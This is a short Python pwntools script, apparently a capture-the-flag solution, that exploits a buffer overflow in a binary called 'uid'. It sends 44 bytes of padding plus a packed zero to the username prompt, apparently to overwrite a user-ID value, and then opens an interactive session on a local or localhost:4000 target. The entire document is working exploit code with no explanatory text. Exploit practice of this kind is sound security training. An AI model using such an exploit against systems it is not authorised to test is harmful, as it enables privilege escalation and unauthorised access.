from pwn import *

exe = ELF('./uid')
context.binary = exe
context.log_level = 'debug'

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)


offset = 44

payload = b'A' * offset + p32(0)

io.recvuntil(b'username: ')
io.sendline(payload)

io.interactive()